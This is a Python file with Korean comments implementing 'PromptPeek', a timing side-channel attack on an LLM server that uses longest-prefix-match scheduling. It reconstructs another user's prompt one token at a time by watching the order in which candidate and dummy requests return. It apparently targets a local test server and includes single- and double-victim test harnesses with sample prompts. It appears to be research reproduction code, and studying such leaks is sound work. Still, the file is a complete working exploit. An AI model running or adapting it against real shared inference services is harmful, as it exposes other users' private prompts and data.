"""
PromptPeek Attack Implementation for LPM Server
단일 토큰 추출 공격 구현
"""

import asyncio
import logging
import time
from typing import List, Optional, Dict, Tuple
import httpx
from promptpeek.candidate.base import get_top_k_candidates, get_bottom_k_dummies

logger = logging.getLogger(__name__)

# Configuration for LPM Server
LPM_SERVER_URL = "http://localhost:8080/func3"
LPM_SERVER_GENERATION_URL = f"{LPM_SERVER_URL}/generate"
CANDIDATES_SIZE = 128  # Number of candidate tokens to consider (reduced)
DUMMIES_SIZE = 8  # Number of dummy requests (reduced)


# Timing configuration
PRE_SLEEP_TIME = 0.1  # Delay after pre-dummies (increased)
POST_SLEEP_TIME = 0.1  # Delay after candidates (increased)

# HTTP client configuration
HTTPX_MAX_CONNECTIONS = int(
    (CANDIDATES_SIZE + DUMMIES_SIZE * 2) * 1.2
)  # Maximum concurrent connections
HTTPX_KEEPALIVE_CONNECTIONS = 20  # Keep-alive connection pool
REQUEST_TIMEOUT = (
    660.0  # Individual request timeout in seconds (increased for queue wait time)
)


async def peek_one_token(
    prefix: str, victim_prompt: Optional[str] = None, max_connections: Optional[int] = None
) -> Tuple[Optional[str], float, float]:
    """
    단일 토큰 추출 공격 - LPM 스케줄링을 이용한 타이밍 공격

    Args:
        prefix: 현재까지 알고 있는 프롬프트 접두사
        victim_prompt: (Optional) 피해자 프롬프트 - 테스트용
        max_connections: (Optional) 최대 동시 연결 수

    Returns:
        (추출된 토큰 또는 None, peek_one_token 경과시간, _send_attack_requests 경과시간)
    """
    start_time = time.time()
    logger.info(f"[*] Attacking prefix: '{prefix[:50]}...'")

    # 1. Victim 프롬프트를 캐시에 로드 (테스트용)
    if victim_prompt:
        await _send_victim_request(victim_prompt)
        await asyncio.sleep(3)  # 캐시 로딩 대기

    # 2. 후보 토큰 생성
    logger.info(f"[*] Generating candidate tokens...")
    candidates = get_top_k_candidates(prefix, k=CANDIDATES_SIZE)
    dummies = get_bottom_k_dummies(prefix, k=DUMMIES_SIZE)
    # dummies = ["%"] * DUMMIES_SIZE  # 고정된 저확률 토큰 사용

    logger.info(
        f"[*] Generated {len(candidates)} candidates and {len(dummies)} dummies"
    )

    # 3. 공격 요청 전송 및 응답 순서 관찰
    matched_token, attack_request_time = await _send_attack_requests(prefix, candidates, dummies, max_connections)

    elapsed_time = time.time() - start_time
    
    if matched_token:
        logger.info(f"[+] Successfully extracted token: '{matched_token}'")
    else:
        logger.warning(f"[-] No token matched - cache miss or eviction")
    
    logger.info(f"[⏱️] Total attack time: {elapsed_time:.2f} seconds")

    return matched_token, elapsed_time, attack_request_time


async def _send_victim_request(prompt: str):
    """피해자 요청을 서버에 전송하여 캐시에 로드"""
    logger.info(f"[VICTIM] Sending victim prompt to cache: '{prompt[:50]}...'")

    try:
        async with httpx.AsyncClient(timeout=REQUEST_TIMEOUT) as client:
            response = await client.post(
                LPM_SERVER_GENERATION_URL,
                content=prompt.encode("utf-8"),
                headers={"Content-Type": "text/plain"},
            )
            response.raise_for_status()
            logger.info(f"[VICTIM] Prompt cached successfully")
    except httpx.ConnectError as e:
        logger.error(f"[VICTIM] Connection failed: {e}")
        raise
    except httpx.TimeoutException as e:
        logger.error(f"[VICTIM] Request timeout: {e}")
        raise
    except Exception as e:
        logger.error(f"[VICTIM] Error: {e}")
        raise


async def _send_lpm_request(
    client: httpx.AsyncClient, prompt: str, metadata: Dict
) -> Tuple[str, Dict]:
    """LPM 서버에 단일 요청 전송 with retry logic"""
    max_retries = 3
    retry_delay = 0.5

    for attempt in range(max_retries):
        try:
            response = await client.post(
                LPM_SERVER_GENERATION_URL,
                content=prompt.encode("utf-8"),
                headers={"Content-Type": "text/plain"},
                timeout=REQUEST_TIMEOUT,
            )
            response.raise_for_status()
            response_text = response.text
            return response_text, metadata
        except (httpx.ConnectError, httpx.TimeoutException) as e:
            if attempt < max_retries - 1:
                logger.debug(
                    f"Retry {attempt + 1}/{max_retries} for {metadata.get('id', 'unknown')}: {e}"
                )
                await asyncio.sleep(retry_delay)
                continue
            else:
                logger.error(
                    f"Connection failed for {metadata.get('id', 'unknown')} after {max_retries} attempts: {e}"
                )
                return "", metadata
        except Exception as e:
            logger.error(f"Request failed for {metadata.get('id', 'unknown')}: {e}")
            return "", metadata

    return "", metadata


async def _send_attack_requests(
    prefix: str, candidates: List[str], dummies: List[str], max_connections: Optional[int] = None
) -> Tuple[Optional[str], float]:
    """
    공격 요청을 순서대로 전송하고 응답 순서를 관찰

    순서: [Pre-dummy] → [Candidates] → [Post-dummy]
    
    Args:
        prefix: 프롬프트 접두사
        candidates: 후보 토큰 리스트
        dummies: 더미 토큰 리스트
        max_connections: 최대 동시 연결 수 (None이면 기본값 사용)
    
    Returns:
        (추출된 토큰 또는 None, 경과 시간)
    """
    attack_start_time = time.time()
    
    # 더미 프롬프트: 저확률 토큰 사용
    dummy_prompt = prefix + dummies[0]

    # max_connections 설정
    if max_connections is None:
        max_connections = HTTPX_MAX_CONNECTIONS

    # 올바른 limits 설정
    limits = httpx.Limits(
        max_keepalive_connections=HTTPX_KEEPALIVE_CONNECTIONS,
        max_connections=max_connections,
        keepalive_expiry=30.0,
    )

    async with httpx.AsyncClient(
        timeout=REQUEST_TIMEOUT, limits=limits, http2=False  # HTTP/1.1 사용 (더 안정적)
    ) as client:
        tasks = []

        # Step 1: Pre-dummy 요청 전송
        logger.info(f"[1/3] Sending {DUMMIES_SIZE} pre-dummy requests...")
        for i in range(DUMMIES_SIZE):
            metadata = {"type": "pre_dummy", "id": f"pre_dummy_{i}"}
            task = asyncio.create_task(
                _send_lpm_request(client, dummy_prompt, metadata)
            )
            tasks.append(task)

        await asyncio.sleep(PRE_SLEEP_TIME)

        # Step 2: Candidate 요청 전송
        logger.info(f"[2/3] Sending {len(candidates)} candidate requests...")
        for i, token in enumerate(candidates):
            candidate_prompt = prefix + token
            metadata = {"type": "candidate", "id": f"candidate_{i}", "token": token}
            task = asyncio.create_task(
                _send_lpm_request(client, candidate_prompt, metadata)
            )
            tasks.append(task)

        await asyncio.sleep(POST_SLEEP_TIME)

        # Step 3: Post-dummy 요청 전송
        logger.info(f"[3/3] Sending {DUMMIES_SIZE} post-dummy requests...")
        for i in range(DUMMIES_SIZE):
            metadata = {"type": "post_dummy", "id": f"post_dummy_{i}"}
            task = asyncio.create_task(
                _send_lpm_request(client, dummy_prompt, metadata)
            )
            tasks.append(task)

        # Step 4: 응답 순서 관찰 (모든 요청 완료까지 대기)
        logger.info(f"[*] Observing response order...")
        response_order = []
        first_post_dummy_arrived = False
        failed_requests = 0
        matched_token = None

        for task in asyncio.as_completed(tasks):
            try:
                response_text, metadata = await task

                # 빈 응답은 실패한 요청
                if not response_text:
                    failed_requests += 1
                    logger.debug(f"[!] Failed request: {metadata.get('id', 'unknown')}")
                    continue

                response_order.append(metadata)

                if metadata["type"] == "post_dummy" and not first_post_dummy_arrived:
                    first_post_dummy_arrived = True
                    logger.debug(
                        f"[*] First post-dummy arrived at position {len(response_order)}"
                    )

                elif metadata["type"] == "candidate":
                    # Post-dummy가 도착하기 전에 온 candidate는 캐시 히트
                    # if not first_post_dummy_arrived and matched_token is None:
                    if matched_token is None:    
                        matched_token = metadata["token"]
                        logger.info(
                            f"[+] Cache HIT detected: '{matched_token}' at position {len(response_order)}"
                        )

            except Exception as e:
                logger.error(f"Task failed: {e}")

        # Step 5: 결과 분석 (모든 요청 완료 후)
        attack_elapsed = time.time() - attack_start_time
        
        logger.info(f"\n{'='*60}")
        logger.info(f"Response Order Analysis:")
        logger.info(f"  Total requests: {len(tasks)}")
        logger.info(f"  Successful responses: {len(response_order)}")
        logger.info(f"  Failed requests: {failed_requests}")
        
        if matched_token:
            logger.info(f"[+] Cache HIT detected - extracted token: '{matched_token}'")
        else:
            logger.info(f"  No cache HIT detected - all candidates arrived after post-dummy")
        
        logger.info(f"[⏱️] Attack request time: {attack_elapsed:.2f} seconds")

        if failed_requests > len(tasks) * 0.3:  # 30% 이상 실패시 경고
            logger.warning(
                f"[!] High failure rate: {failed_requests}/{len(tasks)} ({failed_requests*100/len(tasks):.1f}%)"
            )
            logger.warning(f"[!] Consider reducing CANDIDATES_SIZE or DUMMIES_SIZE")

        return matched_token, attack_elapsed


async def flush_cache():
    """LPM 서버의 캐시를 초기화"""
    logger.info("[*] Flushing LPM server cache...")
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.post(f"{LPM_SERVER_URL}/flush_cache")
            response.raise_for_status()
            logger.info("[+] Cache flushed successfully")
    except Exception as e:
        logger.error(f"[!] Cache flush failed: {e}")


async def test_single_attack(victim_prompt: str, known_prefix: str, peek_count: int = 1, max_connections: Optional[int] = None, victim_id: str = "") -> Tuple[int, List[str], List[float], List[float]]:
    """
    테스트 시나리오: 알려진 피해자 프롬프트에 대한 공격 테스트
    
    Args:
        victim_prompt: 피해자의 전체 프롬프트
        known_prefix: 알고 있는 프롬프트의 접두사 (victim_prompt의 일부)
        peek_count: 추출할 토큰의 개수
        max_connections: (Optional) 최대 동시 연결 수
        victim_id: (Optional) Victim 식별자 (로깅용)
    
    Returns:
        (맞춘_토큰_개수, 추출된_토큰_리스트, peek_one_token_시간들, attack_request_시간들) 튜플
    """
    victim_label = f"[VICTIM{victim_id}]" if victim_id else "[TEST]"
    
    print("\n" + "=" * 80)
    print(f"{victim_label} PromptPeek Attack Test - Extracting {peek_count} Token(s)")
    print("=" * 80 + "\n")

    print(f"{victim_label} Victim prompt: '{victim_prompt}'")
    print(f"{victim_label} Known prefix:  '{known_prefix}'")
    print(f"{victim_label} Peek count:    {peek_count}\n")

    # 반복적으로 토큰 추출
    current_prefix = known_prefix
    extracted_tokens = []
    peek_one_token_times = []
    attack_request_times = []
    
    for i in range(peek_count):
        print(f"\n{victim_label} [{i+1}/{peek_count}] Extracting token from prefix: '{current_prefix[:50]}...'")
        
        # 공격 실행
        extracted_token, peek_time, attack_time = await peek_one_token(current_prefix, victim_prompt=victim_prompt, max_connections=max_connections)
        peek_one_token_times.append(peek_time)
        attack_request_times.append(attack_time)
        
        if extracted_token:
            extracted_tokens.append(extracted_token)
            current_prefix = current_prefix + extracted_token
            print(f"{victim_label} [{i+1}/{peek_count}] ✓ Extracted: '{extracted_token}'")
            print(f"{victim_label} [{i+1}/{peek_count}] Current reconstruction: '{current_prefix[:80]}...'")
        else:
            print(f"{victim_label} [{i+1}/{peek_count}] ✗ Failed to extract token")
            break
    
    # 정확도 검증: 추출된 토큰들이 victim_prompt와 일치하는지 확인
    reconstructed = known_prefix + ''.join(extracted_tokens)
    correct_count = 0
    
    # victim_prompt에서 known_prefix 다음 부분과 비교
    if victim_prompt.startswith(known_prefix):
        expected_part = victim_prompt[len(known_prefix):]
        actual_part = ''.join(extracted_tokens)
        
        # 각 토큰이 올바른지 하나씩 검증
        current_pos = 0
        for token in extracted_tokens:
            if expected_part[current_pos:].startswith(token):
                correct_count += 1
                current_pos += len(token)
            else:
                break
    
    # 결과 출력
    print("\n" + "=" * 80)
    print(f"{victim_label} [RESULT] Extraction Summary:")
    print(f"{victim_label} [RESULT] Total attempts:     {peek_count}")
    print(f"{victim_label} [RESULT] Tokens extracted:   {len(extracted_tokens)}")
    print(f"{victim_label} [RESULT] Correct tokens:     {correct_count}")
    print(f"{victim_label} [RESULT] Accuracy:           {correct_count}/{len(extracted_tokens) if extracted_tokens else 0}")
    print(f"\n{victim_label} [RESULT] Extracted tokens:   {extracted_tokens}")
    print(f"{victim_label} [RESULT] Reconstructed:      '{reconstructed[:100]}...'")
    
    if victim_prompt.startswith(reconstructed):
        print(f"{victim_label} [RESULT] ✓ Reconstruction matches victim prompt!")
    else:
        print(f"{victim_label} [RESULT] ✗ Reconstruction does not match")
        print(f"{victim_label} [RESULT] Expected: '{victim_prompt[len(known_prefix):len(reconstructed)]}'")
        print(f"{victim_label} [RESULT] Got:      '{reconstructed[len(known_prefix):]}'")
    
    print("=" * 80 + "\n")

    return correct_count, extracted_tokens, peek_one_token_times, attack_request_times


def main_single(victim_prompt: str, known_prefix: str, peek_count: int = 1, waiting_time: int = 8, max_connections: Optional[int] = None) -> Tuple[int, List[str], List[float], List[float]]:
    async def _run():
        # 캐시 초기화 (1회만 실행)
        await flush_cache()
        # 공격 실행
        return await test_single_attack(victim_prompt, known_prefix, peek_count, max_connections)
    
    correct_count, extracted_tokens, peek_times, attack_times = asyncio.run(_run())
    print(f"\n[MAIN] Final result: {correct_count} correct tokens out of {len(extracted_tokens)} extracted")
    print(f"[MAIN] Extracted tokens: {extracted_tokens}")

    logger.info(f"[MAIN] Waiting for any pending tasks to complete...")

    for sec in range(waiting_time):
        asyncio.run(asyncio.sleep(1.0))
        logger.info(f"[MAIN] Still waiting...{sec+1}/{waiting_time} seconds")
    logger.info(f"[MAIN] Exiting now.")

    return correct_count, extracted_tokens, peek_times, attack_times


async def test_double_attack(
    victim_prompt1: str,
    known_prefix1: str,
    victim_prompt2: str,
    known_prefix2: str,
    peek_count: int = 1,
    max_connections: Optional[int] = None
) -> Tuple[Tuple[int, List[str], List[float], List[float]], Tuple[int, List[str], List[float], List[float]]]:
    """
    2 Victim - 2 Attacker 동시 공격 테스트
    
    Args:
        victim_prompt1: 첫 번째 피해자의 전체 프롬프트
        known_prefix1: 첫 번째 피해자의 알려진 접두사
        victim_prompt2: 두 번째 피해자의 전체 프롬프트
        known_prefix2: 두 번째 피해자의 알려진 접두사
        peek_count: 각 공격에서 추출할 토큰의 개수
        max_connections: (Optional) 최대 동시 연결 수
    
    Returns:
        ((victim1_결과), (victim2_결과)) 튜플
    """
    print("\n" + "=" * 80)
    print(f"PromptPeek DOUBLE Attack Test - 2 Victims, 2 Attackers")
    print(f"Extracting {peek_count} Token(s) from each victim")
    print("=" * 80 + "\n")
    
    # 캐시 초기화 (1회만)
    await flush_cache()
    
    # Step 1: 두 Victim 프롬프트를 동시에 캐시에 로드
    print("[DOUBLE] Loading both victim prompts into cache...")
    await asyncio.gather(
        _send_victim_request(victim_prompt1),
        _send_victim_request(victim_prompt2)
    )
    print("[DOUBLE] Both victims loaded. Waiting for cache stabilization...")
    await asyncio.sleep(3)  # 캐시 안정화 대기
    
    # Step 2: 2개의 공격을 완전히 동시에 실행 (Option C)
    print("[DOUBLE] Starting simultaneous attacks...\n")
    
    attack_start_time = time.time()
    
    # 동시 공격 실행
    results = await asyncio.gather(
        test_single_attack(victim_prompt1, known_prefix1, peek_count, max_connections, victim_id="1"),
        test_single_attack(victim_prompt2, known_prefix2, peek_count, max_connections, victim_id="2")
    )
    
    attack_elapsed = time.time() - attack_start_time
    
    # Step 3: 결과 집계
    result1, result2 = results
    correct1, tokens1, peek_times1, attack_times1 = result1
    correct2, tokens2, peek_times2, attack_times2 = result2
    
    # 전체 결과 출력
    print("\n" + "=" * 80)
    print("DOUBLE ATTACK RESULTS - Aggregated Summary")
    print("=" * 80)
    print(f"\n--- Overall Statistics ---")
    print(f"Total attack time:        {attack_elapsed:.2f} seconds")
    print(f"Total victims:            2")
    print(f"Tokens per victim:        {peek_count}")
    print(f"\n--- Victim 1 Results ---")
    print(f"Correct tokens:           {correct1}/{len(tokens1)}")
    print(f"Accuracy:                 {correct1/len(tokens1)*100 if tokens1 else 0:.2f}%")
    print(f"Extracted tokens:         {tokens1}")
    print(f"\n--- Victim 2 Results ---")
    print(f"Correct tokens:           {correct2}/{len(tokens2)}")
    print(f"Accuracy:                 {correct2/len(tokens2)*100 if tokens2 else 0:.2f}%")
    print(f"Extracted tokens:         {tokens2}")
    print(f"\n--- Combined Performance ---")
    total_correct = correct1 + correct2
    total_attempted = len(tokens1) + len(tokens2)
    print(f"Total correct tokens:     {total_correct}/{total_attempted}")
    if total_attempted > 0:
        print(f"Combined accuracy:        {total_correct/total_attempted*100:.2f}%")
    else:
        print(f"Combined accuracy:        N/A")
    print("=" * 80 + "\n")
    
    return result1, result2


def main_double(
    victim_prompt1: str,
    known_prefix1: str,
    victim_prompt2: str,
    known_prefix2: str,
    peek_count: int = 1,
    waiting_time: int = 8,
    max_connections: Optional[int] = None
) -> Tuple[Tuple[int, List[str], List[float], List[float]], Tuple[int, List[str], List[float], List[float]]]:
    """
    2 Victim - 2 Attacker 동시 공격의 entry point
    
    Args:
        victim_prompt1: 첫 번째 피해자의 전체 프롬프트
        known_prefix1: 첫 번째 피해자의 알려진 접두사
        victim_prompt2: 두 번째 피해자의 전체 프롬프트
        known_prefix2: 두 번째 피해자의 알려진 접두사
        peek_count: 각 공격에서 추출할 토큰의 개수
        waiting_time: 종료 전 대기 시간 (초)
        max_connections: (Optional) 최대 동시 연결 수
    
    Returns:
        ((victim1_결과), (victim2_결과)) 튜플
    """
    # max_connections 설정 (double attack용으로 증가)
    if max_connections is None:
        max_connections = int((CANDIDATES_SIZE + DUMMIES_SIZE * 2) * 2 * 1.2)  # 2배로 증가
        logger.info(f"[MAIN_DOUBLE] Using max_connections: {max_connections}")
    
    result1, result2 = asyncio.run(
        test_double_attack(
            victim_prompt1, known_prefix1,
            victim_prompt2, known_prefix2,
            peek_count, max_connections
        )
    )
    
    correct1, tokens1, _, _ = result1
    correct2, tokens2, _, _ = result2
    
    print(f"\n[MAIN_DOUBLE] Final results:")
    print(f"[MAIN_DOUBLE] Victim 1: {correct1} correct tokens out of {len(tokens1)} extracted")
    print(f"[MAIN_DOUBLE] Victim 2: {correct2} correct tokens out of {len(tokens2)} extracted")
    print(f"[MAIN_DOUBLE] Extracted tokens V1: {tokens1}")
    print(f"[MAIN_DOUBLE] Extracted tokens V2: {tokens2}")
    
    logger.info(f"[MAIN_DOUBLE] Waiting for any pending tasks to complete...")
    
    for sec in range(waiting_time):
        asyncio.run(asyncio.sleep(1.0))
        logger.info(f"[MAIN_DOUBLE] Still waiting...{sec+1}/{waiting_time} seconds")
    logger.info(f"[MAIN_DOUBLE] Exiting now.")
    
    return result1, result2


def test():
    main_single(
        victim_prompt='I want you to act as an advertiser. You will create a campaign to promote a product or service of your choice. You will choose a target audience, develop key messages and slogans, select the media channels for promotion, and decide on any additional activities needed to reach your goals. My first suggestion request is "I need help creating an advertising campaign for a new type of energy drink targeting young adults aged 18-30."',
        known_prefix="I want you to act as an advertiser. You will create a campaign to promote a product or service of your",
    )


def test_double():
    """2 Victim - 2 Attacker 테스트"""
    main_double(
        victim_prompt1='I want you to act as an advertiser. You will create a campaign to promote a product or service of your choice. You will choose a target audience, develop key messages and slogans, select the media channels for promotion, and decide on any additional activities needed to reach your goals. My first suggestion request is "I need help creating an advertising campaign for a new type of energy drink targeting young adults aged 18-30."',
        known_prefix1="I want you to act as an advertiser. You will create a campaign to promote a product or service of your",
        victim_prompt2='I want you to act as a travel guide. I will write you my location and you will suggest a place to visit near my location. In some cases, I will also give you the type of places I will visit. You will also suggest me places of similar type that are close to my first location. My first suggestion request is "I am in Istanbul/Beyoglu and I want to visit only museums."',
        known_prefix2="I want you to act as a travel guide. I will write you my location and you will suggest a place to visit",
        peek_count=3
    )
